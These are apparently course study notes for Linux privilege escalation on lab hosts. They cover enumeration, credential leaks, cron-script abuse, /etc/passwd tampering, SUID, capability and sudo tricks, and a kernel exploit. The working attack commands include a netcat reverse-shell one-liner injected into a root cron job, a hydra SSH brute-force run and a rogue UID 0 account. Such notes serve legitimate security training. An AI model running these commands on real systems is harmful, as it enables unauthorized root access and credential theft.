# Linux Privilege Escalation Cheat Sheet (PEN-200, Ch. 18)

## Learning Units
1. Enumerating Linux
2. Exposed Confidential Information
3. Insecure File Permissions
4. Abusing Linux System Components

Privilege escalation = leveraging user permissions to access restricted resources (MITRE ATT&CK tactic). Requires the same discipline as any other attack phase: **enumerate first**, then match findings to a technique/exploit.

---

## 18.1 Enumerating Linux

### Linux permissions primer
"Everything is a file" — files, directories, devices, even network sockets are represented in the filesystem, and every one carries **owner / owner-group / others** permissions (`r`, `w`, `x`).

| Perm | Effect on a **file** | Effect on a **directory** |
|---|---|---|
| `r` | read file content | list directory contents |
| `w` | modify file content | create/delete files inside |
| `x` | execute the file | traverse (`cd`) into the directory |

```bash
kali@kali:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1751 May 2 09:31 /etc/shadow
```
First char = file type (ignore for perms). Next 3 = owner (`rw-`), next 3 = group (`r--`), next 3 = others (`---`).

> Execute-without-read on a directory lets a user traverse into known-named entries without being able to list unknown ones.

### 18.1.1 Manual enumeration

> Some commands in this chapter may need minor tweaks depending on target OS version; not all are reproducible on the exam's dedicated clients.

**User/group context**
```bash
joe@debian-privesc:~$ id
uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),...

joe@debian-privesc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
eve:x:1001:1001:,,,:/home/eve:/bin/bash
```
- **root** always UID 0; Linux starts regular ("real") user IDs at **1000**.
- Service accounts use shell `/usr/sbin/nologin` to block interactive login; accounts with a real home dir + shell (e.g. `/bin/bash`) are standard users worth targeting.
- `/etc/passwd` field order: `user:hash-placeholder:UID:GID:comment:home:shell`.

**Hostname / OS / kernel fingerprinting**
```bash
joe@debian-privesc:~$ hostname
debian-privesc

joe@debian-privesc:~$ cat /etc/issue
Debian GNU/Linux 10 \n \l

joe@debian-privesc:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
VERSION_ID="10"
VERSION_CODENAME=buster

joe@debian-privesc:~$ uname -a
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64 GNU/Linux
```
Trust command output over the shell prompt/hostname string — the prompt can be spoofed/misleading. Hostnames often encode role (`web`, `db`, `dc`) or an OS/description naming convention.

> Identifying the kernel version can point straight to a kernel exploit — but kernel exploits can crash the target, so **be extra careful and test in a local/lab environment first whenever possible.**

**Running processes**
```bash
joe@debian-privesc:~$ ps aux        # a = with/without tty, u = user-readable format, x = no-tty procs too
```
Look for root-owned processes worth researching for exploitable behavior/vulnerable versions.

**Network interfaces, routes, sockets**
```bash
joe@debian-privesc:~$ ip a                     # (or: ifconfig) — full adapter config
...
2: ens192: ... inet 192.168.50.214/24 ...
3: ens224: ... inet 172.16.60.214/24 ...
```
> A host bound to multiple networks may be usable as a **pivot** — amplifying visibility into hosts not directly reachable from the attack box.

```bash
joe@debian-privesc:~$ routel        # (or: route) — routing table
joe@debian-privesc:~$ ss -anp       # active sockets / listening ports (loopback-only services matter for local exploitation)
```
A privileged service bound only to `127.0.0.1` isn't remotely reachable but **can be attacked locally** once you have a foothold — expands the attack surface.

**Firewall rules** — listing live `iptables` rules needs root, but the on-disk rule files used to persist/restore rules at boot are often world-readable:
```bash
joe@debian-privesc:~$ cat /etc/iptables/rules.v4
*filter
:INPUT ACCEPT [0:0]
-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
COMMIT
```
Non-default rules (e.g. an odd allowed port) are worth flagging for later investigation.

**Cron jobs**
```bash
joe@debian-privesc:~$ ls -lah /etc/cron*                 # /etc/cron.d, cron.daily, cron.hourly, cron.monthly, cron.weekly
joe@debian-privesc:~$ crontab -l                          # current user's jobs
joe@debian-privesc:~$ sudo crontab -l                      # root's jobs (if sudo allows it)
* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
```
System-administrator-added jobs usually live in `/etc/crontab`; jobs there commonly run as **root** — always check the permissions of the referenced script.

> Being allowed to run `sudo crontab -l` only lets you *list* root's cron jobs — that permission alone cannot be abused directly to get a root shell.

**Installed packages** (needed to match version numbers to exploits — see 18.1.3/18.4.3):
```bash
joe@debian-privesc:~$ dpkg -l          # Debian/Ubuntu
# rpm -qa                              # Red Hat-based (equivalent)
```

**World-writable files/dirs**
```bash
joe@debian-privesc:~$ find / -writable -type d 2>/dev/null
/home/joe/.scripts
...
```
Flags: `-writable` (current user can write), `-type d` (directories), `2>/dev/null` (suppress permission-denied noise). Any world-writable dir tied to a cron job or privileged script deserves a closer look.

**Mounted drives / filesystems**
```bash
joe@debian-privesc:~$ cat /etc/fstab      # drives mounted at boot
joe@debian-privesc:~$ mount               # currently mounted filesystems
joe@debian-privesc:~$ lsblk               # all available disks/partitions
```
> Admins may mount drives via custom scripts that never appear in `/etc/fstab` — always cross-check with `mount` too, not just the static config file.

**Kernel modules/drivers** — feeds kernel-exploit matching:
```bash
joe@debian-privesc:~$ lsmod                     # loaded modules
joe@debian-privesc:~$ /sbin/modinfo libata       # detail on a specific module (needs full path)
```

**SUID binary discovery (preview — full abuse in 18.4.1)**
```bash
joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
...
```
Further reading/reference lists for Linux privesc vectors: **g0tmi1k's compendium**, **PayloadsAllTheThings — Linux Privilege Escalation**, **HackTricks — Linux Privilege Escalation**.

### 18.1.3 Automated enumeration

```bash
kali@kali:~$ unix-privesc-check                       # pre-installed on Kali at /usr/bin/unix-privesc-check
Usage: unix-privesc-check { standard | detailed }
# "standard" = speed-optimized, fewer false positives
# "detailed" = also checks perms of open file handles / called files (linked .so, parsed scripts) — slower, more false positives

joe@debian-privesc:~$ ./unix-privesc-check standard > output.txt   # redirect full findings to file
```
Typical checks: world-writable `/etc/passwd`, `/etc/group`, `/etc/fstab`, `/etc/profile`, `/etc/sudoers`, `/etc/shadow` — e.g. finding `/etc/passwd` writable by non-root is high-impact (lets you create/modify accounts, see 18.3.2).

Other well-known automated enumeration tools: **LinEnum**, **LinPEAS** (actively maintained/enhanced).

> Automated tools catch the common misconfigurations fast, but **unique one-off system quirks are often missed** — manual inspection (18.1.1) still matters.

---

## 18.2 Exposed Confidential Information

### 18.2.1 Inspecting user trails

**Dotfiles / shell startup scripts** (e.g. `.bashrc`) can leak credentials stashed in environment variables for use by custom scripts.
```bash
joe@debian-privesc:~$ env
...
SCRIPT_CREDENTIALS=lab
...

joe@debian-privesc:~$ cat .bashrc
...
export SCRIPT_CREDENTIALS="lab"
```

> Storing a clear-text password in an environment variable is **not secure practice**. Recommended fix: public-key auth for interactive scripts, with private keys protected by a passphrase.

**Direct reuse of the leaked credential:**
```bash
joe@debian-privesc:~$ su - root
Password:
root@debian-privesc:~# whoami
root
```

**Credential-derived password spraying** — build a targeted wordlist from a known partial/base password and brute-force another account:
```bash
kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist        # min/max length 6, -t = pattern, %%% = 3 numeric digits
kali@kali:~$ cat wordlist
Lab000
Lab001
...

kali@kali:~$ hydra -l eve -P wordlist -t 4 -V ssh://192.168.50.214
[22][ssh] host: 192.168.50.214 login: eve password: Lab123
```
```bash
kali@kali:~$ ssh eve@192.168.50.214
```

**Sudo enumeration once on a new account:**
```bash
eve@debian-privesc:~$ sudo -l
User eve may run the following commands on debian-privesc:
       (ALL : ALL) ALL

eve@debian-privesc:~$ sudo -i          # eve is in the sudoers group with full rights -> trivial root
root@debian-privesc:/home/eve# whoami
root
```

### 18.2.2 Inspecting service footprints

Unlike Windows, Linux lets an unprivileged user list/inspect **root-owned processes** directly — hunt process listings for anomalies (creds in command-line args, etc.):
```bash
joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"   # refresh every second, grep for the string "pass"
root ... sh -c sshpass -p 'Lab123' ssh -t eve@127.0.0.1 'sleep 5;exit'
root ... sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
```
Repeatedly-run automated/cron scripts using `sshpass` or similar leak plaintext creds in the process table on every execution.

**tcpdump sudo abuse (password sniffing):**
> `tcpdump` cannot be run without elevated (sudo) permissions — it needs raw sockets, a privileged operation.

```bash
joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
...user:root,pass:lab...
```
Sniffing loopback traffic (`-i lo`) in ASCII (`-A`) can catch plaintext creds passed between local services.

---

## 18.3 Insecure File Permissions

### 18.3.1 Abusing cron jobs

```bash
joe@debian-privesc:~$ grep "CRON" /var/log/syslog
Aug 25 04:57:01 debian-privesc CRON[918]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```
Confirms a script runs under **root** context on a schedule (here, every minute).

```bash
joe@debian-privesc:~$ cat /home/joe/.scripts/user_backups.sh
#!/bin/bash
cp -rf /home/joe/ /var/backups/joe/

joe@debian-privesc:~$ ls -lah /home/joe/.scripts/user_backups.sh
-rwxrwxrw- 1 root root 49 Aug 25 05:12 /home/joe/.scripts/user_backups.sh
```
World-writable (`...rw-` in others) root-run script = trivial privesc: append a payload.

```bash
joe@debian-privesc:~/.scripts$ echo >> user_backups.sh
joe@debian-privesc:~/.scripts$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f' >> user_backups.sh
```
Then catch the reverse shell:
```bash
kali@kali:~$ nc -lnvp 1234
# id
uid=0(root) gid=0(root) groups=0(root)
```
Cron re-executes the script (here, within a minute) and the injected reverse-shell one-liner fires as root.

### 18.3.2 Abusing password authentication

Modern Linux stores hashes in `/etc/shadow` (root-only). Historically (and still for backward compatibility), a password hash present in the **second field of an `/etc/passwd` record takes precedence over `/etc/shadow`**. If `/etc/passwd` is writable, you can set an arbitrary password for any account — including creating a new UID/GID 0 (root-equivalent) account.

```bash
joe@debian-privesc:~$ openssl passwd w00t
Fdzt.eqJQ4s0g

joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

joe@debian-privesc:~$ su root2
Password: w00t
root@debian-privesc:~# id
uid=0(root) gid=0(root) groups=0(root)
```
- `openssl passwd` defaults to the **crypt** algorithm; older systems may default to **DES**, some newer ones to **MD5** — behavior varies by system.
- UID **0** and GID **0** are what make the new account a superuser account.

> Even though a world-writable `/etc/passwd` sounds unlikely, hybrid integrations with third-party vendors sometimes trade security for usability — check it anyway.

---

## 18.4 Insecure System Components

### 18.4.1 Abusing setuid binaries and capabilities

**Real vs. effective UID** — normally all four UID values (real, effective, saved-set, filesystem) match the launching user. A **SUID (Set-User-ID)** binary breaks that: it runs with the **file owner's** privileges regardless of who launched it.

```bash
joe@debian-privesc:~$ ps u -C passwd
root  1932 ... passwd

joe@debian-privesc:~$ grep Uid /proc/1932/status
Uid: 1000 0 0 0                 # real=1000(joe), effective/saved/fs = 0(root)

joe@debian-privesc:~$ cat /proc/1131/status | grep Uid   # a normal (non-SUID) bash process, for comparison
Uid: 1000 1000 1000 1000
```

```bash
joe@debian-privesc:~$ ls -asl /usr/bin/passwd
64 -rwsr-xr-x 1 root root 63736 Jul 27 2018 /usr/bin/passwd
```
`s` in the owner-execute position = SUID bit set (settable via `chmod u+s`). Owned by root ⇒ any user executing it runs with root's effective UID.

**SUID abuse via `find`:**
```bash
joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
bash-5.0# id
uid=1000(joe) gid=1000(joe) euid=0(root)
bash-5.0# whoami
root
```
`-p` on bash prevents the effective UID from being dropped once inside the shell.

**Linux capabilities** — finer-grained privileged attributes (e.g. raw packet capture, kernel module loading) assignable to binaries/processes without full SUID; misconfigured, they escalate the same way.
```bash
joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl5.28.1 = cap_setuid+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
```
`cap_setuid+ep` on `perl` (effective+permitted) is directly exploitable:
```bash
joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1000(joe)
```

> SUID files can be ELF binaries or scripts — check both formats. For a curated list of exploitable SUID/capability commands, use **GTFOBins**.

### 18.4.2 Abusing sudo

```bash
joe@debian-privesc:~$ sudo -l
Matching Defaults entries for joe on debian-privesc:
    env_reset, mail_badpass, secure_path=...
User joe may run the following commands on debian-privesc:
    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```
Cross-reference each allowed binary against **GTFOBins** for a known sudo-escalation payload.

- `crontab -l` here is read-only listing — not abusable for privesc.
- `tcpdump` via GTFOBins suggests a checkpoint/rotation-script payload trick — but on this target it fails:
```bash
joe@debian-privesc:~$ COMMAND='id'
joe@debian-privesc:~$ TF=$(mktemp)
joe@debian-privesc:~$ echo "$COMMAND" > $TF
joe@debian-privesc:~$ chmod +x $TF
joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
# ... compress_savefile: execlp(...) failed: Permission denied
```
```bash
joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
... apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" ...
```
**AppArmor** (mandatory access control, enabled by default on Debian 10) blocked the exec — check its status:
```bash
root@debian-privesc:~# aa-status
apparmor module is loaded.
20 profiles are loaded.
18 profiles are in enforce mode.
   ...
   /usr/sbin/tcpdump
```

> A binary being sudo-allowed doesn't guarantee a GTFOBins payload will work — MAC frameworks like **AppArmor** or **SELinux** can silently block the technique. Always check `syslog`/`audit` logs when a "known-good" exploit fails.

- `apt-get` succeeds via GTFOBins' `changelog` trick (invokes `less`, which can spawn a shell):
```bash
joe@debian-privesc:~$ sudo apt-get changelog apt
# inside the pager, type:
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

### 18.4.3 Exploiting kernel vulnerabilities

Success depends on matching **kernel version + OS flavor** (Debian, RHEL, Gentoo, etc.) to a working exploit.

```bash
joe@ubuntu-privesc:~$ cat /etc/issue
Ubuntu 16.04.4 LTS \n \l

joe@ubuntu-privesc:~$ uname -a
Linux ubuntu-privesc 4.4.0-116-generic #... x86_64 ...
```

```bash
kali@kali:~$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | linux/local/45010.c
...
```
Filter chain: keep 4.x hits, drop anything below 4.4.0, drop 4.8-specific ones — narrows to candidates matching kernel `4.4.0-116`.

```bash
kali@kali:~$ mv 45010.c cve-2017-16995.c
kali@kali:~$ scp cve-2017-16995.c joe@192.168.123.216:
```
Compile **on the target itself** when possible (matches target's exact libs/arch, avoids cross-compile issues — target already ships `gcc`):
```bash
joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995
joe@ubuntu-privesc:~$ file cve-2017-16995          # confirm arch/format before running
cve-2017-16995: ELF 64-bit LSB executable, x86-64, ...

joe@ubuntu-privesc:~$ ./cve-2017-16995
[*] creating bpf map
...
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),1001(joe)
```

> Kernel exploits are powerful but risky — a bad match (wrong kernel build/arch) can **crash the target**. Read the exploit source's "Tested on" comments, confirm exact kernel build string, and test locally first if at all possible.

---

## Key Takeaways / Workflow Summary
1. **Baseline enumeration first** (18.1): `id`/`/etc/passwd` for users, `hostname`/`uname -a`/`/etc/os-release` for OS+kernel, `ps aux` for privileged processes, `ip a`/`routel`/`ss -anp` for network exposure, cron (`/etc/cron*`, `crontab -l`, `sudo crontab -l`), `dpkg -l`/`rpm -qa` for package versions, `find -writable`, `mount`/`/etc/fstab`/`lsblk`, `lsmod`/`modinfo`, and an early SUID sweep (`find / -perm -u=s -type f`). Automate the baseline with `unix-privesc-check`, LinEnum, or LinPEAS — but still manually check for one-off quirks automation misses.
2. **Hunt for exposed credentials** (18.2): dotfiles (`.bashrc`), `env`, process-table snooping (`watch ps aux | grep pass`, `sshpass` in cron), and sudo-abusable sniffers (`tcpdump`). Reuse discovered creds directly (`su`) or spray a derived wordlist (`crunch` + `hydra`) against other accounts.
3. **Insecure file permissions** (18.3): a world-writable root-run cron script = inject a reverse-shell one-liner and wait. A world-writable `/etc/passwd` = append a new UID/GID 0 account with an `openssl passwd`-generated hash.
4. **Abuse system components** (18.4): SUID binaries (`ls -asl`, `find -perm -u=s`, abuse via `find -exec ... -p`) and capabilities (`getcap -r /`) both grant an elevated *effective* UID — cross-check both against **GTFOBins**. `sudo -l` output should also be checked against GTFOBins, but verify against MAC frameworks (**AppArmor**/SELinux, `aa-status`, `/var/log/syslog`) when a "known" payload unexpectedly fails.
5. **Kernel exploits are the last resort**: fingerprint exact kernel+OS (`uname -a`, `/etc/issue`), `searchsploit` + filter to matching versions, compile with `gcc` (ideally on-target to match libs/arch), verify with `file`, then run — but test cautiously, since a mismatched exploit can destabilize or crash the box.
